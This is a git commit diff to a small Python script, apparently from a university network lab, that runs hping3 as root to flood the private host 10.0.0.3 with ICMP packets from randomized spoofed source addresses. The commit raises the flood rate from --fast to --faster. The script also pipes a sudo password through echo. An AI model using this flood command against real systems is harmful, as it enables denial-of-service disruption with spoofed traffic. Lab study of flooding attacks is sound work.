8a9b77f0efa94ce919dfb2275ec20501449b1246
Ante Skoric <ante.skoric@haw-hamburg.de>
2020-12-06 13:55:17 +0100

    Update to the flood_table_one_dest_host

--- flood_table_one_dest_host.py
+++ flood_table_one_dest_host.py
@@ -5,4 +5,4 @@ data_size = "5"
 dest_ip = "10.0.0.3"
 sudoPassword = ''
 
-os.system('echo %s|sudo -S %s' % (sudoPassword, "hping3 --fast " + " --icmp -p 7 " + "-d " + data_size + " --rand-source " + dest_ip))
+os.system('echo %s|sudo -S %s' % (sudoPassword, "hping3 --faster " + " --icmp -p 7 " + "-d " + data_size + " --rand-source " + dest_ip))
